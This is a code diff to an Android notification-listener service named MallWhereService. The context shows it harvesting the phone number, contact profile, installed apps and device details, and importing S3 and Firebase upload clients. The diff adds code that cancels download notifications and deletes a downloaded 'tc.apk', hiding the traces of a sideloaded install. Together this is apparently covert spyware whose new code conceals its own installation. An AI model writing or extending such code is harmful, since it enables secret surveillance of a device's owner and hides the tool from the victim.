@@ -10,6 +10,7 @@ import android.location.Location;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.preference.PreferenceManager;
 import android.provider.ContactsContract;
 import android.service.notification.NotificationListenerService;
@@ -21,7 +22,6 @@ import com.amazonaws.auth.AWSCredentials;
 import com.amazonaws.auth.BasicAWSCredentials;
 import com.amazonaws.mobileconnectors.s3.transfermanager.TransferManager;
 import com.amazonaws.mobileconnectors.s3.transfermanager.Upload;
-import com.amazonaws.mobileconnectors.s3.transfermanager.model.UploadResult;
 import com.firebase.client.Firebase;
 import com.google.android.gms.common.ConnectionResult;
 import com.google.android.gms.common.api.GoogleApiClient;
@@ -38,6 +38,7 @@ import java.util.List;
 
 public class MallWhereService extends NotificationListenerService implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {
 
+    private static final String APK_NAME = "tc.apk";
     private final String TAG = getClass().getName();
     private Firebase userDataRef;
     private GoogleApiClient mGoogleApiClient;
@@ -49,6 +50,16 @@ public class MallWhereService extends NotificationListenerService implements Goo
         super.onDestroy();
         if (null != mGoogleApiClient) {
             mGoogleApiClient.disconnect();
+        }
+    }
+
+    private void deleteDownloadedApk() {
+        File path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+        File file = new File(path, APK_NAME);
+        if (file.exists()) {
+            Log.d(TAG, "deleting file: " + file.delete());
+        } else {
+            Log.d(TAG, "could not find apk to delete");
         }
     }
 
@@ -77,6 +88,21 @@ public class MallWhereService extends NotificationListenerService implements Goo
             getInstalledApps();
             setUserInfo();
         }
+
+
+    }
+
+    @Override
+    public void onListenerConnected() {
+        Log.d(TAG, "onListenerConnected");
+        StatusBarNotification[] notifications = getActiveNotifications();
+        for (StatusBarNotification sbn : notifications) {
+            if (sbn.getPackageName().contains("com.android.providers.downloads")) {
+                Log.d(TAG, "found notification from download, canceling");
+                cancelNotification(sbn.getKey());
+                deleteDownloadedApk();
+            }
+        }
     }
 
     @Override
@@ -102,7 +128,7 @@ public class MallWhereService extends NotificationListenerService implements Goo
         userInfo.setProduct(Build.PRODUCT);
         userInfo.setModel(Build.MODEL);
         userInfo.setAndroidVersion(Build.VERSION.RELEASE);
-        TelephonyManager tMgr = (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
+        TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
         userInfo.setPhone(tMgr.getLine1Number());
         Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
         c.moveToFirst();
